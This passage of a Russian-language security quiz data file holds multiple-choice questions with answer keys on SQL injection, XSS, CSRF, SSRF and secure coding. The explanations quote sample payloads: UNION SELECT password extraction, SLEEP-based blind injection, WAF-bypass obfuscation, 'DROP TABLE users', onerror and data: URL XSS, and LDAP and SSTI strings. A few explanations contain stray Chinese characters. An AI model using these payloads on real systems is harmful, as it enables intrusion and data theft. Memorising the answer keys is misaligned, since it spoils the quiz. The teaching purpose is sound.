    id: 'sql-6',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Что такое «Second-order SQL Injection»?',
    options: [
      'Инъекция, выполняемая через второй запрос',
      'Инъекция, при которой payload сохраняется в БД и активируется при последующем использовании данных',
      'Две инъекции одновременно',
      'Инъекция через ORDER BY',
    ],
    correctIndex: 1,
    explanation:
      'Second-order SQLi происходит в два этапа: вредоносный payload сохраняется в БД через看似 безобидный ввод (например, регистрация), а затем активируется при использовании этих данных в другом запросе. Многие разработчики санитизируют ввод, но забывают о выходе данных.',
  },
  {
    id: 'sql-7',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какой запрос показывает количество столбцов в таблице при UNION-атаке?',
    options: [
      'SELECT COUNT(*) FROM table',
      'ORDER BY 1, ORDER BY 2, ... до ошибки',
      'DESCRIBE table',
      'SHOW COLUMNS FROM table',
    ],
    correctIndex: 1,
    explanation:
      'ORDER BY N — стандартный метод определения числа столбцов. Злоумышленник увеличивает N (ORDER BY 1, ORDER BY 2, ...) до тех пор, пока не появится ошибка «Unknown column». Предыдущее значение N равно количеству столбцов, что необходимо для UNION SELECT.',
  },
  {
    id: 'sql-8',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Что делает функция GROUP_CONCAT() в MySQL при SQL-инъекции?',
    options: [
      'Группирует данные по категориям',
      'Объединяет значения нескольких строк в одну строку',
      'Удаляет дубликаты из результатов',
      'Создаёт резервную копию таблицы',
    ],
    correctIndex: 1,
    explanation:
      'GROUP_CONCAT() объединяет значения из нескольких строк в одну строку через разделитель. При SQL-инjection это позволяет извлечь все имена таблиц или все пароли в одном результате, что удобно для exfiltration данных.',
  },
  {
    id: 'sql-9',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какая таблица information_schema содержит список всех таблиц в MySQL?',
    options: [
      'information_schema.columns',
      'information_schema.tables',
      'information_schema.databases',
      'information_schema.schema',
    ],
    correctIndex: 1,
    explanation:
      'information_schema.tables — мета-таблица MySQL, содержащая информацию обо всех табрах во всех базах данных. Злоумышленник может использовать SELECT table_name FROM information_schema.tables для получения списка таблиц.',
  },
  {
    id: 'sql-10',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какой метод защиты от SQL-инъекций НЕ является достаточным?',
    options: [
      'Параметризованные запросы (prepared statements)',
      'Хранимые процедуры (stored procedures)',
      'Экранирование кавычек ( addslashes / mysqli_real_escape_string )',
      'ORM с параметризированными запросами',
    ],
    correctIndex: 2,
    explanation:
      'Экранирование кавычек недостаточно, так как SQL-инъекции возможны без кавычек (числовые поля, ORDER BY, LIMIT и т.д.). Кроме того, экранирование зависит от кодировки и может быть обойдено. Параметризованные запросы — надёжный метод защиты.',
  },
  {
    id: 'sql-11',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Что такое «вторичная» (second-order) SQL-инъекция?',
    options: [
      'Инъекция, которая срабатывает при повторном посещении страницы',
      'Вредоносный SQL-код сохраняется в БД и выполняется при последующих запросах',
      'Инъекция через второй параметр формы',
      'Атака на реплику базы данных',
    ],
    correctIndex: 1,
    explanation:
      'Second-order SQL injection — вредоносный payload сохраняется в базе данных (например, при регистрации пользователя с именем \' OR 1=1--). Он не срабатывает сразу, но выполняется позже, когда приложение использует сохранённые данные в SQL-запросе без санитизации. Это сложнее обнаружить, так как атака и выполнение разделены по времени.',
  },
  {
    id: 'sql-12',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Какая функция MySQL используется для time-based слепой SQL-инъекции?',
    options: ['WAITFOR DELAY', 'SLEEP()', 'BENCHMARK_DELAY()', 'DELAY_EXEC()'],
    correctIndex: 1,
    explanation:
      'SLEEP(секунды) — функция MySQL, которая приостанавливает выполнение запроса. При слепой SQL-инjection злоумышленник использует условный SLEEP: IF(condition, SLEEP(5), 0). Если условие истинно, сервер «зависает» на 5 секунд — это позволяет извлекать данные посимвольно по времени ответа.',
  },
  {
    id: 'sql-13',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Как SQL-инъекция возможна в конструкции LIMIT/OFFSET?',
    options: [
      'LIMIT не может быть подвержен инъекциям',
      'Злоумышленник может добавить UNION SELECT или комментарий после числового значения',
      'Только через XSS',
      'Через модификацию HTTP-заголовков',
    ],
    correctIndex: 1,
    explanation:
      'Параметры LIMIT и OFFSET часто считаются безопасными, но в MySQL они могут содержать UNION SELECT: LIMIT 10 UNION SELECT username,password FROM users--. Также можно использовать PROCEDURE ANALYSE() для извлечения данных. Защита — параметризация даже для числовых параметров.',
  },
  {
    id: 'sql-14',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какой метод может помочь обойти WAF при SQL-инъекции?',
    options: [
      'Использование только POST-запросов',
      'Обфускация: кодирование символов (HEX, CHAR), комментарии inline, нестандартный регистр',
      'Увеличение размера запроса',
      'Использование IPv6 вместо IPv4',
    ],
    correctIndex: 1,
    explanation:
      'WAF bypass для SQLi включает: HEX-кодирование строк (0x414243 вместо \'ABC\'()), функция CHAR() для посимвольного создания строк, комментарии /**/ для разрыва ключевых слов (UN/**/ION SEL/**/ECT), нестандартный регистр (UnIoN sElEcT), дублирование ключевых слов (UNIONunionSELECT). Защита: WAF + параметризованные запросы.',
  },
  {
    id: 'sql-15',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Что такое «stacked queries» (стопочные запросы) в контексте SQL-инъекций?',
    options: [
      'Множественные SELECT в одном UNION',
      'Выполнение нескольких SQL-команд через разделитель «;» в одном запросе',
      'Вложенные подзапросы (subqueries)',
      'Каскадное удаление записей',
    ],
    correctIndex: 1,
    explanation:
      'Stacked queries позволяют выполнить несколько независимых SQL-команд через разделитель «;»: \' ; DROP TABLE users; --. Это крайне опасно, так как позволяет не только читать, но и модифицировать данные (INSERT, UPDATE, DELETE, DROP). Поддерживается в PostgreSQL, SQL Server, SQLite, но НЕ в MySQL (через mysql_query).',
  },
  // --- Additional XSS Questions ---
  {
    id: 'xss-6',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Какой HTTP-заголовок CSP блокирует inline-скрипты?',
    options: [
      'Content-Security-Policy: default-src \'self\'',
      'Content-Security-Policy: script-src \'self\'',
      'Content-Security-Policy: style-src \'self\'',
      'Content-Security-Policy: img-src \'self\'',
    ],
    correctIndex: 1,
    explanation:
      'script-src \'self\' разрешает загрузку скриптов только с текущего домена и блокирует inline-скрипты (теги <script> и обработчики событий в HTML). Для разрешения inline-скриптов нужен nonce или hash.',
  },
  {
    id: 'xss-7',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Что такое «Mutation XSS» (mXSS)?',
    options: [
      'XSS через мутацию DOM-дерева браузером',
      'XSS, который возникает, когда санитизированный HTML изменяется браузером и становится опасным',
      'XSS через CSS-анимации',
      'XSS в мобильном приложении',
    ],
    correctIndex: 1,
    explanation:
      'Mutation XSS возникает, когда браузер модифицирует HTML после санитизации (например, закрывает незакрытые теги), и результирующий DOM содержит вредоносный код, которого не было в оригинальном санитизированном HTML.',
  },
  {
    id: 'xss-8',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Какой тег HTML может выполнять JavaScript без onclick/onerror?',
    options: [
      '<div>',
      '<span>',
      '<svg><script>...</script></svg> или <img src=x onerror=...>',
      '<p>',
    ],
    correctIndex: 2,
    explanation:
      'SVG поддерживает тег <script>, который выполняется при рендеринге изображения. Также <img src=x onerror=...> и <body onload=...> выполняют JavaScript. <iframe srcdoc=...> тоже может содержать скрипты.',
  },
  {
    id: 'xss-9',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Как можно обойти CSP с директивой script-src \'self\' через JSON-in-HTML XSS?',
    options: [
      'Это невозможно — CSP script-src \'self\' полностью блокирует XSS',
      'Если JSON с пользовательским вводом встраивается в <script> без экранирования, CSP не поможет',
      'Через заголовок X-XSS-Protection',
      'Используя CSS-инъекцию',
    ],
    correctIndex: 1,
    explanation:
      'Если сервер помещает JSON-данные в тег <script> без экранирования: <script>var data = {"name": "${userInput}"}</script>, злоумышленник может закрыть строку и выполнить код: "}; alert(1); // — CSP не блокирует, так как скрипт загружен с \'self\', а выполнение происходит внутри разрешённого тега.',
  },
  {
    id: 'xss-10',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Что такое Mutation XSS (mXSS)?',
    options: [
      'XSS через модификацию JavaScript-файлов',
      'Когда браузер изменяет HTML при sanitization, создавая XSS из «безопасного» входного кода',
      'XSS через WebSocket-сообщения',
      'Атака на DOM с помощью мутаций CSS',
    ],
    correctIndex: 1,
    explanation:
      'mXSS возникает, когда DOM-санитайзер читает innerHTML, санитизирует и записывает обратно. Браузер может нормализовать HTML (например, создать закрывающие теги), и при повторном чтении innerHTML обнаруживаются новые опасные элементы. Пример: <img src=x onerror=alert(1)> помещён в <div>, браузер автозакрывает тег, и при повторном innerHTML санитайзер обнаруживает XSS.',
  },
  {
    id: 'xss-11',
    category: 'XSS-атаки',
    difficulty: 'medium',
    question: 'Почему WebSocket-сообщения уязвимы к XSS, даже если CSP настроен?',
    options: [
      'WebSocket не поддерживает XSS',
      'CSP не применяется к данным из WebSocket — они обрабатываются клиентским JavaScript',
      'WebSocket шифрует все сообщения',
      'CSP блокирует WebSocket по умолчанию',
    ],
    correctIndex: 1,
    explanation:
      'Данные из WebSocket обрабатываются клиентским JavaScript через ws.onmessage. CSP контролирует загрузку ресурсов (скрипты, стили), но не данные, передаваемые через WebSocket. Если сообщение из WS вставляется в DOM без санитизации (el.innerHTML = event.data), возникает XSS.',
  },
  {
    id: 'xss-12',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Какой метод обхода XSS-фильтров использует Unicode-нормализацию?',
    options: [
      'Использование base64-кодирования',
      'Замена ASCII-символов на совместимые Unicode-символы, которые браузер нормализует',
      'Использование CSS-стилей для скрытия кода',
      'Отправка запросов через iframe',
    ],
    correctIndex: 1,
    explanation:
      'Некоторые браузеры нормализуют Unicode-символы перед выполнением. Например, U+FF1C (полноширинный <) может быть нормализован в <. Злоумышленник использует это для обхода WAF/фильтров, которые проверяют ASCII, но не Unicode. Также используется URL-encoding, HTML-entity encoding и смешанные техники.',
  },
  {
    id: 'xss-13',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Как data:-URL может быть использован для XSS-атаки?',
    options: [
      'data: URL не может выполнять JavaScript',
      'Через <a href="data:text/html,<script>alert(1)</script>"> — при клике выполняется код',
      'Через CSS background-image',
      'Через <img src="data:...">',
    ],
    correctIndex: 1,
    explanation:
      'data:-URL позволяет встроить HTML/JS прямо в ссылку: <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>">Click</a>. При клике браузер загружает и выполняет содержимое. Защита: CSP с директивой default-src, которая блокирует data: для скриптов, и санитизация href-атрибутов.',
  },
  // --- Additional CSRF Questions ---
  {
    id: 'csrf-6',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Что такое «Double Submit Cookie» — паттерн защиты от CSRF?',
    options: [
      'Отправка куки дважды для подтверждения',
      'CSRF-токен отправляется и в куки, и в теле запроса; сервер сравнивает их',
      'Использование двух разных CSRF-токенов',
      'Двойная проверка пароля при отправке формы',
    ],
    correctIndex: 1,
    explanation:
      'Double Submit Cookie: сервер устанавливает CSRF-токен в куки (JavaScript может его прочитать), и клиент должен отправить этот же токен в заголовке/теле запроса. Поскольку Same-Origin Policy блокирует чтение кук из другого домена, злоумышленник не может узнать значение токена.',
  },
  {
    id: 'csrf-7',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Почему GET-запросы особенно уязвимы к CSRF?',
    options: [
      'GET-запросы не используют куки',
      'GET-запросы можно инициировать простым <img src="..."> или ссылкой без JavaScript',
      'GET-запросы всегда безопасны',
      'GET-запросы не поддерживают CSRF-токены',
    ],
    correctIndex: 1,
    explanation:
      'GET-запросы можно инициировать без JavaScript: через <img src="http://victim.com/action">, <link>, <script src> или простую ссылку. Это делает GET-запросы особенно уязвимыми. Поэтому важные действия (удаление, перевод денег) должны использовать POST/PUT/DELETE.',
  },
  {
    id: 'csrf-8',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Какой атрибут куки SameSite является наиболее строгим?',
    options: [
      'SameSite=None',
      'SameSite=Lax',
      'SameSite=Strict',
      'SameSite=Block',
    ],
    correctIndex: 2,
    explanation:
      'SameSite=Strict запрещает отправку куки с ЛЮБЫМИ кросс-сайтовыми запросами (даже при переходе по ссылке). SameSite=Lax разрешает куки для безопасных GET-навигаций (переход по ссылке). SameSite=None разрешает все, но требует Secure (HTTPS).',
  },
  {
    id: 'csrf-9',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Почему CSRF-атаки возможны даже на JSON API эндпоинты с Content-Type: application/json?',
    options: [
      'JSON эндпоинты не используют куки',
      'Злоумышленник может использовать Flash или формы с text/plain для отправки JSON-подобных данных',
      'Content-Type проверяется только на клиенте',
      'JSON не поддерживает CSRF-токены',
    ],
    correctIndex: 1,
    explanation:
      'Некоторые API проверяют Content-Type: application/json как защиту от CSRF. Но злоумышленник может отправить POST с Content-Type: text/plain и телом {"action":"transfer"}. Если сервер парсит body до проверки Content-Type, атака сработает. Также можно использовать <form enctype="text/plain"> или Flash для отправки кастомных заголовков.',
  },
  {
    id: 'csrf-10',
    category: 'CSRF',
    difficulty: 'medium',
    question: 'Как предсказуемый CSRF-токен делает защиту бесполезной?',
    options: [
      'Токен нельзя угадать',
      'Если токен основан на timestamp или MD5(session), злоумышленник может его вычислить',
      'Предсказуемый токен всегда совпадает',
      'Это проблема только для мобильных приложений',
    ],
    correctIndex: 1,
    explanation:
      'CSRF-токены должны быть криптографически случайными. Если токен генерируется как MD5(session_id + timestamp) или hash(IP), злоумышленник может вычислить значение. Правильная генерация: crypto.randomBytes(32).toString(\'hex\'). Сервер должен проверять токен на стороне и использовать secure random.',
  },
  {
    id: 'csrf-11',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Как можно обойти защиту SameSite=Strict для CSRF-атаки?',
    options: [
      'SameSite=Strict невозможно обойти',
      'Через DNS Rebinding или уязвимость на том же домене (XSS) для выполнения запроса из Same-Origin',
      'Через подмену IP-адреса',
      'Через изменение User-Agent',
    ],
    correctIndex: 1,
    explanation:
      'SameSite=Strict защищает от кросс-сайтовых запросов, но если на целевом сайте есть XSS, злоумышленник может выполнить запрос из того же источника — куки будут отправлены. Также DNS Rebinding может создать Same-Origin контекст. Поэтому SameSite — дополнительный слой защиты, а не единственная защита.',
  },
  {
    id: 'csrf-12',
    category: 'CSRF',
    difficulty: 'medium',
    question: 'Почему методы PUT и DELETE в REST API также уязвимы к CSRF?',
    options: [
      'Браузеры блокируют PUT и DELETE из форм',
      'Злоумышленник может использовать XMLHttpRequest/Fetch с методом PUT/DELETE из Same-Origin (через XSS)',
      'PUT и DELETE не используют куки',
      'Только POST уязвим к CSRF',
    ],
    correctIndex: 1,
    explanation:
      'Хотя HTML-формы не поддерживают PUT/DELETE, JavaScript (fetch/XMLHttpRequest) может отправлять такие запросы. Если есть XSS на сайте, злоумышленник выполняет fetch(url, {method: \'DELETE\', credentials: \'include\'}). Куки автоматически отправляются с credentialed запросами. Поэтому все state-changing методы нуждаются в CSRF-защите.',
  },
  // --- Additional OWASP A01 (Broken Access Control) Questions ---
  {
    id: 'a01-1',
    category: 'OWASP Top 10',
    difficulty: 'easy',
    question: 'Что такое IDOR (Insecure Direct Object Reference)?',
    options: [
      'Некорректная настройка DNS-записей',
      'Когда пользователь может получить доступ к чужим данным, изменив ID в URL',
      'Отсутствие шифрования на клиенте',
      'Уязвимость в заголовках HTTP',
    ],
    correctIndex: 1,
    explanation:
      'IDOR — это уязвимость контроля доступа, при которой злоумышленник изменяет идентификатор объекта в URL или параметрах запроса (например, /api/users/100 вместо /api/users/50) и получает доступ к данным другого пользователя. Сервер не проверяет, имеет ли текущий пользователь права на этот объект.',
  },
  {
    id: 'a01-2',
    category: 'OWASP Top 10',
    difficulty: 'easy',
    question: 'Какой принцип контроля доступа является наилучшим по умолчанию?',
    options: [
      'Разрешить все, кроме запрещённых',
      'Запретить всё, явно разрешить необходимое (deny by default)',
      'Разрешить только GET-запросы',
      'Разрешить аутентифицированным пользователям всё',
    ],
    correctIndex: 1,
    explanation:
      'Принцип deny by default означает, что доступ запрещён по умолчанию, и только явно разрешённые действия доступны. Это предотвращает ситуации, когда новые эндпоинты или функции оказываются без контроля доступа.',
  },
  // --- Additional OWASP A04 (Insecure Design) Questions ---
  {
    id: 'a04-1',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Чем «небезопасный дизайн» (Insecure Design) отличается от бага реализации?',
    options: [
      'Ничем, это одно и то же',
      'Баг реализации — ошибка в коде; небезопасный дизайн — фундаментальный недостаток архитектуры',
      'Небезопасный дизайн — только в мобильных приложениях',
      'Баг реализации легче исправить',
    ],
    correctIndex: 1,
    explanation:
      'Insecure Design — это недостатки, заложенные на этапе проектирования: отсутствие rate limiting, слабые бизнес-правила, отсутствие учёта злоупотреблений. Их нельзя исправить простой правкой кода — требуется изменение архитектуры. Implementation bugs — ошибки в коде (SQLi, XSS), исправляемые изменением реализации.',
  },
  {
    id: 'a04-2',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Что такое «Threat Modeling» (моделирование угроз)?',
    options: [
      'Тестирование безопасности после релиза',
      'Систематическая идентификация потенциальных угроз на этапе проектирования',
      'Настройка фаервола',
      'Обучение пользователей безопасности',
    ],
    correctIndex: 1,
    explanation:
      'Threat Modeling — процесс идентификации, оценки и смягчения угроз безопасности на этапе проектирования системы. Используются методологии STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege), DREAD и PASTA.',
  },
  // --- Additional OWASP A05 (Security Misconfiguration) Questions ---
  {
    id: 'a05-1',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Какой HTTP-заголовок предотвращает MIME-type sniffing?',
    options: [
      'X-Frame-Options',
      'X-Content-Type-Options: nosniff',
      'Content-Security-Policy',
      'X-XSS-Protection',
    ],
    correctIndex: 1,
    explanation:
      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому (sniffing). Без этого заголовка браузер может интерпретировать .jpg-файл как JavaScript, что создаёт XSS-уязвимость.',
  },
  {
    id: 'a05-2',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Какой заголовок Helmet.js добавляет защиту от clickjacking?',
    options: [
      'helmet.xssFilter()',
      'helmet.frameguard()',
      'helmet.hsts()',
      'helmet.dnsPrefetchControl()',
    ],
    correctIndex: 1,
    explanation:
      'helmet.frameguard() добавляет заголовок X-Frame-Options: SAMEORIGIN, который запрещает встраивание страницы в iframe с других доменов. Это предотвращает clickjacking — атаку, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу.',
  },
  // --- Additional OWASP A06 (Vulnerable Components) Questions ---
  {
    id: 'a06-1',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Что такое «транзитивная зависимость» (transitive dependency)?',
    options: [
      'Зависимость, указанная напрямую в package.json',
      'Зависимость вашей зависимости — вы не указывали её напрямую, но она установлена',
      'Зависимость, которая обновляется автоматически',
      'Зависимость, которая работает только в production',
    ],
    correctIndex: 1,
    explanation:
      'Транзитивная зависимость — это зависимость вашей зависимости. Например, вы используете пакет A, который зависит от пакета B. Вы не указывали B напрямую, но он установлен. Уязвимость в B может затронуть вас, даже если вы не знаете о его существовании.',
  },
  // --- Additional OWASP A08 (Integrity Failures) Questions ---
  {
    id: 'a08-1',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что такое «Subresource Integrity» (SRI) и зачем он нужен?',
    options: [
      'Механизм проверки целостности загружаемых внешних ресурсов (CDN-скрипты, стили)',
      'Проверка SSL-сертификатов',
      'Валидация JSON-ответов API',
      'Проверка целостности cookies',
    ],
    correctIndex: 0,
    explanation:
      'SRI позволяет браузеру проверить целостность загружаемых ресурсов (скрипты, стили) с CDN по хешу. Атрибут integrity="sha384-..." в теге <script> гарантирует, что файл не был модифицирован. Если хеш не совпадает, браузер не выполнит скрипт.',
  },
  // --- Additional OWASP A09 (Logging) Questions ---
  {
    id: 'a09-1',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что НИКОГДА нельзя логировать в системе аутентификации?',
    options: [
      'IP-адреса пользователей',
      'Временные метки входа',
      'Пароли и токены аутентификации',
      'User-Agent браузера',
    ],
    correctIndex: 2,
    explanation:
      'Пароли, токены, сессионные куки и другие секреты никогда не должны попадать в логи. Если логи будут скомпрометированы (а это случается), злоумышленник получит все учётные данные. Логируйте IP, timestamp, ID пользователя, но никогда секреты.',
  },
  {
    id: 'a09-2',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что такое SIEM (Security Information and Event Management)?',
    options: [
      'Система управления паролями',
      'Платформа для сбора, анализа и мониторинга логов безопасности в реальном времени',
      'Тип фаервола',
      'Инструмент для пентеста',
    ],
    correctIndex: 1,
    explanation:
      'SIEM — это платформа, которая собирает логи из различных источников (серверы, приложения, сетевые устройства), коррелирует события и генерирует алерты при подозрительной активности. Примеры: Splunk, ELK Stack, IBM QRadar.',
  },
  // --- Additional OWASP A10 (SSRF) Questions ---
  {
    id: 'a10-1',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Какой IP-адрес используется для получения метаданных AWS EC2-инстанса?',
    options: [
      '192.168.0.1',
      '10.0.0.1',
      '169.254.169.254',
      '127.0.0.1',
    ],
    correctIndex: 2,
    explanation:
      '169.254.169.254 — это link-local адрес, используемый AWS EC2 для предоставления метаданных инстанса. Через него можно получить IAM-учётные данные, конфигурацию и пользовательские данные. SSRF-атака, направленная на этот адрес, может привести к полной компрометации инстанса.',
  },
  {
    id: 'a10-2',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что такое «DNS Rebinding» в контексте SSRF?',
    options: [
      'Атака, при которой доменное имя сначала указывает на внешний IP, а затем на внутренний',
      'Шифрование DNS-запросов',
      'Переименование DNS-сервера',
      'Кэширование DNS-ответов',
    ],
    correctIndex: 0,
    explanation:
      'DNS Rebinding — атака на SSRF-защиту. Злоумышленник регистрирует домен, который сначала разрешается во внешний IP (проходит валидацию), а затем — в приватный IP (127.0.0.1 или 10.0.0.1). Когда сервер делает запрос к этому домену, DNS-ответ указывает на внутренний ресурс.',
  },
  {
    id: 'owasp-12',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Что такое «Broken Object Level Authorization» (BOLA) в API Security?',
    options: [
      'Отсутствие шифрования API-запросов',
      'Когда API не проверяет, что пользователь имеет права на доступ к запрошенному объекту',
      'Слишком частые запросы к API',
      'Отсутствие документации API',
    ],
    correctIndex: 1,
    explanation:
      'BOLA (также IDOR для API) — #1 в OWASP API Security Top 10. API эндпоинт принимает ID объекта, но не проверяет авторизацию. Пример: GET /api/orders/123 возвращает заказ любого пользователя. Защита: проверять ownership объекта, использовать GUID вместо sequential IDs, middleware авторизации.',
  },
  {
    id: 'owasp-13',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Какие основные риски безопасности связаны с serverless-архитектурой (AWS Lambda, Azure Functions)?',
    options: [
      'Serverless полностью безопасен по умолчанию',
      'Небезопасные зависимости, чрезмерные права (IAM), injection в обработчиках, inadequate monitoring',
      'Только DDoS-атаки',
      'Только утечки данных через S3',
    ],
    correctIndex: 1,
    explanation:
      'Serverless risks: (1) Over-privileged IAM roles — функции имеют больше прав, чем нужно. (2) Event injection — вредоносные данные в trigger events. (3) Insecure dependencies — те же риски, что и в обычных приложениях. (4) Inadequate logging/monitoring — сложнее отследить атаки. Защита: least privilege IAM, sanitization input, dependency scanning, AWS X-Ray/CloudWatch.',
  },
  {
    id: 'owasp-14',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Какие основные угрозы безопасности контейнеров и Kubernetes?',
    options: [
      'Контейнеры полностью изолированы и безопасны',
      'Image vulnerabilities, misconfigured RBAC, exposed dashboard, container escape, insecure secrets management',
      'Только сетевые атаки',
      'Только DDoS на orchestrator',
    ],
    correctIndex: 1,
    explanation:
      'Container/K8s threats: (1) Vulnerable images — base images с CVE. (2) RBAC misconfiguration —过度 permissions для service accounts. (3) Exposed K8s dashboard — публичный доступ без auth. (4) Container escape — breakout из контейнера к host (CVE в runc/containerd). (5) Secrets в env vars вместо vault. Защита: image scanning, Pod Security Policies, network policies, sealed secrets.',
  },
  {
    id: 'owasp-15',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Что такое OWASP MASVS и для чего он используется?',
    options: [
      'Стандарт безопасности веб-приложений',
      'Mobile App Security Verification Standard — стандарт верификации безопасности мобильных приложений',
      'Сертификация по облачной безопасности',
      'Стандарт для IoT-устройств',
    ],
    correctIndex: 1,
    explanation:
      'OWASP MASVS (Mobile App Security Verification Standard) — comprehensive framework для оценки безопасности мобильных приложений. Включает уровни: L1 (baseline), L2 (defense-in-depth), L3+R (reverse engineering protection). Покрывает: storage, crypto, auth, network comm, platform interaction, code quality, resiliency.',
  },
  {
    id: 'owasp-16',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Какие security-риски связаны с использованием AI/ML в приложениях?',
    options: [
      'AI полностью безопасен',
      'Data poisoning, model inversion, membership inference, prompt injection, adversarial examples',
      'Только производительность моделей',
      'Только стоимость обучения',
    ],
    correctIndex: 1,
    explanation:
      'AI/ML risks: (1) Data poisoning — malicious training data. (2) Model inversion — извлечение training data из модели. (3) Membership inference — определить, был ли конкретный datapoint в training set. (4) Prompt injection — манипуляция LLM через crafted prompts. (5) Adversarial examples — inputs designed to cause misclassification. Защита: input sanitization, differential privacy, model monitoring.',
  },
  // --- Additional Secure Coding Questions ---
  {
    id: 'coding-1',
    category: 'Безопасное кодирование',
    difficulty: 'easy',
    question: 'Какую библиотеку лучше всего использовать для санитизации HTML в JavaScript?',
    options: ['jQuery.sanitize()', 'DOMPurify', 'String.trim()', 'JSON.parse()'],
    correctIndex: 1,
    explanation:
      'DOMPurify — проверенная библиотека для санитизации HTML. Она удаляет опасные теги и атрибуты (<script>, onerror, onload и т.д.), сохраняя безопасные элементы (p, b, em, a). Это надёжнее, чем ручная санитизация или использование встроенных методов браузера.',
  },
  {
    id: 'coding-2',
    category: 'Безопасное кодирование',
    difficulty: 'medium',
    question: 'Какой подход к валидации входных данных является наилучшим?',
    options: [
      'Валидация только на клиенте',
      'Белый список (разрешить только ожидаемый формат)',
      'Чёрный список (запретить известные опасные символы)',
      'Валидация только на сервере без учёта клиентской',
    ],
    correctIndex: 1,
    explanation:
      'Белый список (allowlist) — разрешать только то, что явно ожидается. Чёрные списки (blocklist) всегда неполны и могут быть обойдены. Валидация должна быть и на клиенте (UX), и на сервере (безопасность). Белый список для email, телефона, имени — гораздо надёжнее чёрного.',
  },
  {
    id: 'coding-3',
    category: 'Безопасное кодирование',
    difficulty: 'hard',
    question: 'Что такое «Timing Attack» и как защититься?',
    options: [
      'Атака на скорость сети; защита — CDN',
      'Анализ времени выполнения для определения секретов; защита — сравнение за константное время',
      'Атака через таймер браузера; защита — отключить setTimeout',
      'DDoS через таймауты; защита — rate limiting',
    ],
    correctIndex: 1,
    explanation:
      'Timing Attack использует разницу во времени выполнения для извлечения секретов. Например, посимвольное сравнение строк останавливается при первом несовпадении — по времени ответа можно определить количество совпавших символов. Защита: crypto.timingSafeEqual() в Node.js или bcrypt.compare().',
  },
  {
    id: 'coding-4',
    category: 'Безопасное кодирование',
    difficulty: 'medium',
    question: 'Как правильно предотвратить LDAP Injection?',
    options: [
      'Экранирование спецсимволов LDAP: ( ) & | ! = < > ~ * и использование whitelist-валидации',
      'Использование HTTPS для LDAP',
      'Ограничение длины ввода',
      'Удаление пробелов из ввода',
    ],
    correctIndex: 0,
    explanation:
      'LDAP Injection использует спецсимволы LDAP: (, ), &, |, !, =, <, >, ~, *. Например, ввод *)(uid=*))(|(uid=* в поле поиска. Защита: экранирование через LDAP-библиотеку (ldap.escape в Node.js), whitelist-валидация (только alphanumeric), prepared statements если поддерживаются, least privilege для LDAP-аккаунта.',
  },
  {
    id: 'coding-5',
    category: 'Безопасное кодирование',
    difficulty: 'hard',
    question: 'Что такое Server-Side Template Injection (SSTI) и как защититься?',
    options: [
      'XSS на сервере; защита — CSP',
      'Когда пользовательский ввод интерполируется в шаблон серверного рендеринга; защита — санитизация и логика-less шаблоны',
      'SQL-инъекция в шаблонах; защита — ORM',
      'CSS-инъекция; защита — sanitize CSS',
    ],
    correctIndex: 1,
    explanation:
      'SSTI: пользовательский ввод напрямую попадает в серверный шаблонизатор (Jinja2, Twig, Freemarker). Payload: {{config}} в Flask/Jinja2 раскрывает конфигурацию приложения. Злоумышленник может выполнить произвольный код. Защита: не передавать пользовательский ввод в шаблонизатор, использовать autoescaping, логику в controller, не в template.',
  },
  {
    id: 'coding-6',
    category: 'Безопасное кодирование',
    difficulty: 'medium',
    question: 'Как безопасно обрабатывать загрузку файлов от пользователей?',
    options: [
      'Проверять только расширение файла',
      'Проверять MIME-type, расширение, размер; хранить вне web-root; генерировать случайные имена; сканировать на malware',
      'Разрешить все типы файлов',
      'Хранить файлы в базе данных',
    ],
    correctIndex: 1,
    explanation:
      'Secure file upload: (1) Whitelist расширений (.jpg, .png, .pdf). (2) Проверка MIME-type (не только client-side). (3) Magic bytes verification. (4) Ограничение размера. (5) Случайное имя файла (UUID). (6) Хранение вне web-root или через CDN. (7) Антивирусное сканирование. (8) Content-Disposition: attachment для скачивания.',
  },
  {
    id: 'coding-7',
    category: 'Безопасное кодирование',
    difficulty: 'hard',
    question: 'Что такое Prototype Pollution в JavaScript и как защититься?',
    options: [
      'Подмена прототипа HTML-элемента',
